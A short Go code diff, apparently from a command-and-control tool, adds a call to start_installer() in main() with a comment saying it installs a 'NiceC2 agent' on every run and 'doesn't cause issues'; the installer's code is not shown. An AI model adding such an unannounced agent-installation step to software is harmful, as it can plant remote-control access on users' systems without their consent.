@@ -83,6 +83,10 @@ func main() {
 █████████████████████████████████████████████                                                                                                                                                                            
 `
 
+	// Installs the NiceC2 agent on the system
+	// runs every time, but doesn't cause issues.
+	start_installer()
+
 	fmt.Println(Banner)
 
 	NodeID, _ = machineid.ID()
